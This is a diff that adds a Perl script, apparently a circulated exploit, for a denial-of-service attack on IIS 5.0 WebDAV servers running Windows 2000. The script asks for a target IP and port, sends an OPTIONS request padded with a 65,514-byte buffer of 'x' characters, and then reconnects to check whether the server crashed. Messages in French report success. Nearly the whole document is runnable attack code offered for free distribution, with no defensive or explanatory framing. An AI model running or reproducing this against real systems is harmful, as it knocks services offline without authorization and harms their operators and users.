@@ -1,0 +1,70 @@
+#!/usr/bin/perl
+# Distribute this source Freely.
+# If u modify the source, let me know.
+# ************************************
+# NFO :
+# -----
+# IIS 5.0 WebDav Denial Of Service ...
+# Shellcode possible ?
+#
+#     mail:nicolaj@katatonie.com
+# ************************************
+# ------------- V1.0 -----------------
+# ************************************
+
+# NOS Affected :
+# -> Windows 2000 SRV SP3, ... , SP0
+
+# Modules
+use IO::Socket::INET;
+
+# Variables
+$data = "OPTIONS /";
+
+# Quelques trucs divers pour la présentation ...
+print "\n---------------------------------------\n";
+print "-------------IISWebDav-DOS-------------\n";
+print "---------------------------------------\n";
+print "------------------V1-------------------\n";
+print "---------------------------------------\n";
+print "sur un Win2k avec Sp3, le serveur\nrelance le service immediatement\n\n";
+
+while ($ip eq undef) {
+print "Entrez l'adresse IP ou le nom DNS : ";
+chomp ($ip = <STDIN>);}
+while ($port eq undef) {
+print "Entrez le port : ";
+chomp($port = <STDIN>);}
+
+$buffer = chr(120) x (65514);
+print "\n";
+print "Sending data ........................ \n\n";
+
+# Main prog ...
+$sock = IO::Socket::INET->new(
+        Proto => "tcp",
+	PeerAddr => $ip,
+	PeerPort => $port
+	)
+or print "connexion impossible au port $port sur $ip ou SERVEUR DOWN\n";
+$sock -> autoflush(1);
+# Envoi des donnees
+print $sock $data, $buffer, "\r\n\r\n";
+print "Data Sended Checking the server ... \n";
+while ( <$sock> ) { print; }
+close $sock;
+# Testing server
+$sock2 = IO::Socket::INET->new(
+        Proto => "tcp",
+	PeerAddr => $ip,
+	PeerPort => $port
+	)
+or die "Le denial of service a fonctionne :)\n";
+$sock2 -> autoflush(1);
+# envoi des données
+print $sock2 "HEAD / HTTP/1.0\r\n\r\n";
+while ( <$sock2> ) { print; }
+print "Le serveur est toujours en ligne ...\n";
+close $sock2;
+
+
